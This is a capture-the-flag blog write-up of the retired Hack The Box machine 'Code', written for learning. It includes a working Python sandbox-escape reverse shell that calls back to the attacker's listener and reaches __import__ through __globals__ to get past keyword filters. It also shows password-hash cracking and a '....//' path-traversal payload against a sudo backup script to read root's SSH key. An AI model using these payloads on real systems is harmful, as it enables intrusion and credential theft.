---
layout: post
title: "Code"
date: 2025-08-02
categories: [htb, easy]
provider: htb
machine: code
retired: true
---

Code was the first box that made me consider getting Hack The Box's VIP+ subscription, to peacefully work on it without other players' interference. Stability is one thing, but it's just too easy to get spoiled. Somehow, though, being partially spoiled ended up making this box more fun. You'll see why.

<div class="attack-chain">
  {% include attack-step.html title="RCE via restriction bypass" description="Obtained reverse shell connection by bypassing keyword restrictions in Python interpreter" type="attack" %}
  {% include attack-step.html title="Enumerate file system" description="Discovered MD5 hashes of credentials in application database" type="enum" %}
  {% include attack-step.html title="Foothold" description="Cracked weak passwords and logged into SSH as user `martin`" type="foothold" %}
  {% include attack-step.html title="Enumerate permissions" description="Discovered that `martin` can run backup script as root via sudo" type="enum" %}
  {% include attack-step.html title="Exploit vulnerability" description="Abused backup script's path traversal vulnerability to gain access to files in `/root`" type="attack" %}
  {% include attack-step.html title="Privilege escalation" description="Logged into SSH as root using private key" type="root" %}
</div>

## Lo-fi hip hop music on
Our initial `nmap` scan found a minimalist machine, just the way I like them:
```
$ sudo nmap -sV 10.10.11.62 -vv -oA initial-tcp
<SNIP>
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Pointing the browser at this "Gunicorn" HTTP server found a Python interpreter: write code on the left, see the result on the right. It sounds too easy to pop a shell, but it's just the sound of it - try a common one-liner such as `__import__('os').popen('bash ...').read()`, and you're immediately greeted with a _try-harder_ message: "Use of restricted keywords is not allowed".

Before I started trying too hard, I searched for known vulnerabilities on Gunicorn 20.0.4. Turns out it is possible to perform [request smuggling](https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-smuggling/), which I had to read up on, but it didn't seem useful until I knew what to target in the first place. Nothing else popped up, so it looked like we were stuck trying to break free from this restricted keyword jail.

## Why this write-up exists
I told you I wouldn't write these if I didn't learn anything. This part is where the learning happened. While the [Command Injections](https://academy.hackthebox.com/course/preview/command-injections) module on HTB Academy had given me plenty of ideas for bypassing exclusion lists in general, I'd never had to do this with the Python language, with which I still had a hack-something-together kind of relationship.

Slowly going through just that one-liner above, we can find out that `import`, `os`, `(p)open`, and even `read` are restricted. The only other thing I knew was that anything that I could turn into a string to be interpreted would be easy to bypass with concatenation - for example, `print("os")` would be restricted, but `print("o"+"s")` wouldn't.

This helped with scanning through [Hacktricks](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/bypass-python-sandboxes/index.html?highlight=python%20sandbox#bypass-python-sandboxes)' _immense_ list of things to try, looking for what could work under these limitations. `system`, `exec` and `eval` adding to the list of restrictions didn't leave that many options open, especially when trying to get a reverse shell. One thing that stood out was that despite not being able to use `import`, I was able to use `sys.modules["<some module>"]`. Together with the string concatenation trick, that got us _very_ close to a reverse shell.

I started from the following reverse shell example from [Revshells](https://revshells.com):
```
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
s.connect(("10.10.14.100", 8888));
os.dup2(s.fileno(), 0);
os.dup2(s.fileno(), 1);
os.dup2(s.fileno(), 2);
pty.spawn("sh");
```

We can't `import`, so the interpreter doesn't know what `socket`, `os` and `pty` are. But with `sys.modules[]`, I could do this:
```
socketlib = sys.modules["socket"]
s = socketlib.socket(socketlib.AF_INET, socketlib.SOCK_STREAM);
s.connect(("10.10.14.100", 8888));
sys.modules["o"+"s"].dup2(s.fileno(), 0);
sys.modules["o"+"s"].dup2(s.fileno(), 1);
sys.modules["o"+"s"].dup2(s.fileno(), 2);
sys.modules["pty"].spawn("sh");
```

And I got a connection on my `netcat` listener! Only... it didn't respond to my commands:
```
$ nc -nlvp 8888         
listening on [any] 8888 ...
connect to [10.10.14.100] from (UNKNOWN) [10.10.11.62] 44530
whoami
ls
hello?
```

I noticed that the Python interpreter had printed `'pty'`, unexpectedly. Debugging, I wrote the following print statements, and got the responses shown directly underneath:
```
print(sys.modules["o"+"s"])
<module 'os' from '/usr/lib/python3.8/os.py'> 

print(sys.modules["socket"])
<module 'socket' from '/usr/lib/python3.8/socket.py'> 

print(sys.modules["pty"])
'pty'
```

It turns out that `sys.modules` [doesn't do what I thought it did](https://docs.python.org/3/library/sys.html#sys.modules). It doesn't import, why would it? It maps module names to modules that have _already been loaded_. And obviously `pty` had not been loaded by anything in this application yet. I started to think this was getting too complicated for an easy box. Luckily, I had been spoiled earlier on. Allow me to explain.

## Cheese
Earlier, somewhere between giving up on the request smuggling avenue and starting to get deeper into the Python jail-breaking odyssey, I checked the result of the full TCP `nmap` scan I'd left running as usual. And oh! There's a couple of hidden ports!
```
$ sudo nmap -p- -sV 10.10.11.62 -vv -oA full-tcp
<SNIP>
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    syn-ack ttl 63 Gunicorn 20.0.4
8989/tcp open  http    syn-ack ttl 63 SimpleHTTPServer 0.6 (Python 3.8.10)
9191/tcp open  http    syn-ack ttl 63 SimpleHTTPServer 0.6 (Python 3.8.10)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I load them up on the browser, weirdly they show the same content but hey, I'm not complaining. There's a `tar.bz2` archive that I can get, and it seems to contain the app's source code! And the `sqlite` database that manages the users, so I can get user's password hashes, and they crack! I use them to SSH in and this guy has sudo rights to a backup script, and...

... wait, _what?_ What was the point of that whole Gunicorn app then? It dawned on me that I had probably just cheesed the box using some other player's work, and sure enough, at the next box reset those HTTP servers weren't there anymore. So I stopped and went back to figuring out how to get a shell out of this.

Flashback over, and we're back to realising that we'd need to import `pty` to get our reverse shell to work, and thinking that this was getting too complicated. The thought came to mind that spawning an HTTP server would probably be a whole lot easier, and indeed it was, again thanks to the necessary modules already being loaded:
```
PORT = 54322

Handler = sys.modules["http.server"].SimpleHTTPRequestHandler

with sys.modules["socketserver"].TCPServer(("", PORT), Handler) as httpd:
    print("serving at port", PORT)
    httpd.serve_forever()
```

But I felt spoiled. Would I have thought of this if I hadn't seen someone else do it? And also, the reverse shell felt so close now... so I kept looking, and I'm glad I did.

## Why this write-up exists, continued
Ok, so, we need to figure out a way to import `pty`. I mean, there's got to be one, right? Scrolling down that immense list of Hacktricks, most everything needs an `eval` or an `exec`, until hope is briefly restored in the [Builtins section](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/bypass-python-sandboxes/index.html?highlight=python%20sandbox#builtins), with the sentence _"If you can access the `__builtins__` object you can import libraries"_. I say briefly because, sure enough, `__builtins__` is part of the restricted keyword list.

But this section is helpfully followed by "No builtins", and it offers _many_ ways of overcoming having no access to this object. Two options stand out:
```
help.__call__.__builtins__   # or __globals__
...
get_flag.__globals__['__builtins__']
```

So... we can access `__globals__` through something like `help.__call__`... and we can access `__builtins__`, **_as a string_**, through it... which allows us to access `__import__`, **_also as a string_**... So I guess we can do `help.__call__.__globals__['__buil'+'tins__']['__imp'+'ort__']("pty")`... right?

Hahahahah right!
```
socketlib = sys.modules["socket"]
s = socketlib.socket(socketlib.AF_INET, socketlib.SOCK_STREAM);
s.connect(("10.10.14.100", 8888));
sys.modules["o"+"s"].dup2(s.fileno(), 0);
sys.modules["o"+"s"].dup2(s.fileno(), 1);
sys.modules["o"+"s"].dup2(s.fileno(), 2);
help.__call__.__globals__['__buil'+'tins__']['__imp'+'ort__']("pty").spawn("sh");
```

```
$ nc -nlvp 8888
listening on [any] 8888 ...
connect to [10.10.14.100] from (UNKNOWN) [10.10.11.62] 34816
$ whoami
whoami
app-production
```

It doesn't last for long due to the cleanup scripts (I think), so you should establish a stable shell from here, but it sure does the job. It definitely doesn't feel like an intended path, so I most likely missed something easier, or the HTTP server is really what comes to mind to most people. I look forward to reading other write-ups on this one! Let's move on.

## The rest
The rest was straightforward. We get our user flag, and find the `database.db` file that holds the saved python snippets for each user, but most importantly also each user's password hash:
```
$ sqlite3 database.db
sqlite> .table
code  user
sqlite> .headers on
sqlite> select * from code;
id|user_id|code|name
1|1|print("Functionality test")|Test
sqlite> select * from user;
id|username|password
1|development|7<REDACTED>3
2|martin|3<REDACTED>e
```

By the looks of it it's simply MD5, and the app's code confirms it:
```
$ cat app.py
<SNIP>
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
<SNIP>
```

Hashcat cracks both easily, but only Martin's is useful to us:
```
$ hashcat 3<REDACTED>e rockyou.txt -m 0
<SNIP>
3<REDACTED>e:<REDACTED>
```

We try the credentials with SSH, and \[hacker voice\] _we're in_. What are the two commands we always run when we land on a Linux box? That's right:
```
$ ssh martin@code.htb
martin@code.htb's password:
<SNIP>
martin@code:~$ id
uid=1000(martin) gid=1000(martin) groups=1000(martin)
martin@code:~$ sudo -l
<SNIP>
User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

`backy.sh` is a long script for what it does, which is setting up a backup job in the shape of a json file, for another `backy` binary to run. These are the important bits:
```
martin@code:~$ cat /usr/bin/backy.sh
<SNIP>

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

<SNIP>

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

<SNIP>
```

In English: only allow paths that _start_ with `/var/` or `/home/`, and use `gsub` to remove any `../` from the path, trying to prevent path traversal.

A quick test showed that this was not a secure way to prevent path traversal. Since the substitutions won't happen recursively, you just need to prepare a string that will still result in path traversal after the substitution:
```
$ echo "../../before/....//....//after" |awk '{ gsub("\\.\\./", ""); print }'            
before/../../after
```

So all we have to do is prepare our `task.json` accordingly to get a backup of the `/root/` directory. The important bit is the `directories_to_archive` field, but you can also see my cute little attempt to both hide and prevent spoiling other people, and also make them feel guilty for looking:
```
martin@code:/tmp/.XIM-unix/.dontcheat$ cat task.json 
{
  "destination": "/tmp/.XIM-unix/.dontcheat/",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": [
    "/home/....//root/"
  ],
  "exclude": [
    "*nothing"
  ]
}
```

Now we just call the script with `sudo`, unpack the archive and get that root flag! Luckily, in case we wanted a shell, we also get an SSH private key:
```
martin@code:/tmp/.XIM-unix/.dontcheat$ sudo /usr/bin/backy.sh task.json 
2025/07/31 18:15:40 🍀 backy 1.2
2025/07/31 18:15:40 📋 Working with task.json ...
2025/07/31 18:15:40 💤 Nothing to sync
2025/07/31 18:15:40 📤 Archiving: [/home/../root]
2025/07/31 18:15:40 📥 To: /tmp/.XIM-unix/.dontcheat ...
2025/07/31 18:15:40 📦
martin@code:/tmp/.XIM-unix/.dontcheat$ ls
code_home_.._root_2025_July.tar.bz2  task.json
martin@code:/tmp/.XIM-unix/.dontcheat$ tar xvjf code_home_.._root_2025_July.tar.bz2 
<SNIP>
root/root.txt
<SNIP>
root/.ssh/id_rsa
<SNIP>
```

I mean, why not? Back in our machine:
```
$ scp martin@code.htb:/tmp/.XIM-unix/.dontcheat/root/.ssh/id_rsa .
martin@code.htb's password: 
id_rsa                                         100% 2590    55.2KB/s   00:00
$ chmod 0600 id_rsa                 
$ ssh -i id_rsa root@code.htb
<SNIP>
root@code:~#  
```

## Roll the credits
- I still don't know Python like I know Java, but now I know ways of accessing modules I might not be intended to have access to.
- In all seriousness, that was a useful, albeit off-the-deep-end dive into Python's module system.
- As always, for reading this far, you're a champ.